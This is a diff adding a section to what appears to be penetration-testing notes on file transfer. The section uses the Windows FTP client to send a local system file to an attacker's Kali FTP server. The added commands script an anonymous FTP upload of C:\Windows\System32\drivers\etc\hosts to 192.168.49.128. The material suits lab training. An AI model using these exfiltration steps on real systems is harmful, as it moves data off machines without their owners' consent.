@@ -318,3 +318,12 @@ sudo python3 -m pyftpdlib --port 21 --write
 
 - `ftp://192.168.49.128/ftp-hosts`: Destination on your Kali FTP server. The uploaded file will be named `ftp-hosts`.
 - `C:\Windows\System32\drivers\etc\hosts`: Local Windows file being uploaded.
+
+#### Using windows FTP Client
+```powershell
+echo open 192.168.49.128 > ftpcommand.txt
+echo USER anonymous >> ftpcommand.txt
+echo binary >> ftpcommand.txt
+echo PUT C:\Windows\System32\drivers\etc\hosts >> ftpcommand.txt
+echo bye >> ftpcommand.txt
+```
